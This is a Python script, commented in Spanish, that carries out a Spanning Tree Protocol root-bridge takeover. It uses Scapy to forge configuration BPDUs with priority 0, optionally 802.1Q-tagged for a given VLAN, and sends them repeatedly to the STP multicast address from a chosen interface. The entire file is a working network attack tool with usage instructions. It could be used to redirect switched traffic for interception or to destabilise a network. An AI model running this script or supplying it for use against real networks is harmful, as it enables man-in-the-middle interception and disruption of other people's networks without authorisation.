#!/usr/bin/env python3
"""
Ataque STP Root Claim - BPDUs manuales (CORREGIDO temporizadores)
Uso: sudo python3 stp_attack.py -i eth2 --vlan 10
"""

import argparse, sys, time, struct, signal, os
from threading import Event

from scapy.all import Ether, Dot1Q, LLC, sendp, get_if_hwaddr

RED, GREEN, YELLOW, CYAN, RESET, BOLD = "\033[91m", "\033[92m", "\033[93m", "\033[96m", "\033[0m", "\033[1m"
stop_event = Event()

def mac_to_bytes(mac): return bytes.fromhex(mac.replace(':', ''))

def build_stp_payload(priority, bridge_mac, hello_time, vlan_id=0):
    """
    Construye el payload STP con temporizadores en ticks de 1/256 s.
    """
    # Convertir segundos a ticks (1 tick = 1/256 s)
    hello_ticks = hello_time * 256
    max_age_ticks = 20 * 256
    fwd_delay_ticks = 15 * 256
    message_age_ticks = 0

    # Prioridad de 16 bits: 4 bits superiores (prioridad/4096) + 12 bits inferiores (VLAN ID)
    ext_priority = priority + vlan_id   # Con prioridad 0 y vlan 10 → 10

    mac_bytes = mac_to_bytes(bridge_mac)
    root_id = struct.pack('!H', ext_priority) + mac_bytes
    bridge_id = root_id   # nosotros somos el root

    payload  = struct.pack('!H', 0)               # Protocol ID
    payload += struct.pack('!B', 0)               # Version (STP)
    payload += struct.pack('!B', 0)               # BPDU Type (Config)
    payload += struct.pack('!B', 0)               # Flags
    payload += root_id                            # Root ID (8 bytes)
    payload += struct.pack('!I', 0)               # Root Path Cost
    payload += bridge_id                          # Bridge ID
    payload += struct.pack('!H', 0x8001)          # Port ID
    payload += struct.pack('!H', message_age_ticks)  # Message Age
    payload += struct.pack('!H', max_age_ticks)      # Max Age
    payload += struct.pack('!H', hello_ticks)        # Hello Time
    payload += struct.pack('!H', fwd_delay_ticks)    # Forward Delay
    return payload

def build_bpdu(iface, priority, vlan_id, bridge_mac, hello):
    stp_mcast = "01:80:c2:00:00:00"
    stp_payload = build_stp_payload(priority, bridge_mac, hello, vlan_id)
    if vlan_id:
        pkt = Ether(src=bridge_mac, dst=stp_mcast) / Dot1Q(vlan=vlan_id, prio=7) / LLC(dsap=0x42, ssap=0x42, ctrl=3) / stp_payload
    else:
        pkt = Ether(src=bridge_mac, dst=stp_mcast) / LLC(dsap=0x42, ssap=0x42, ctrl=3) / stp_payload
    return pkt

def attack(iface, priority, hello, vlan_id, bridge_mac, duration):
    if not bridge_mac:
        bridge_mac = get_if_hwaddr(iface)
    print(f"{GREEN}[+] Interfaz: {iface} | MAC: {bridge_mac} | Prioridad: {priority} | VLAN: {vlan_id or 'ninguna'}{RESET}")
    print(f"{YELLOW}[!] Enviando BPDUs cada {hello}s...{RESET}\n")
    sent, start = 0, time.time()
    def handler(sig, frame):
        print(f"\n{YELLOW}[*] Detenido.{RESET}")
        stop_event.set()
    signal.signal(signal.SIGINT, handler)

    while not stop_event.is_set():
        try:
            pkt = build_bpdu(iface, priority, vlan_id, bridge_mac, hello)
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
            elapsed = time.time() - start
            print(f"{GREEN}[→] BPDU #{sent:04d} enviado | Tiempo: {elapsed:.0f}s{RESET}")
            if duration and elapsed >= duration:
                break
            time.sleep(hello)
        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")
            break
    print(f"\n{BOLD}{GREEN}[✓] BPDUs enviados: {sent}{RESET}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", required=True)
    parser.add_argument("--priority", type=int, default=0)
    parser.add_argument("--hello", type=int, default=2)
    parser.add_argument("--vlan", type=int, default=None)
    parser.add_argument("--mac", type=str, default=None)
    parser.add_argument("--duration", type=int, default=0)
    if os.geteuid() != 0:
        print(f"{RED}[!] Ejecutar con sudo.{RESET}"); sys.exit(1)
    args = parser.parse_args()
    attack(args.interface, args.priority, args.hello, args.vlan, args.mac, args.duration)

if __name__ == "__main__":
    main()
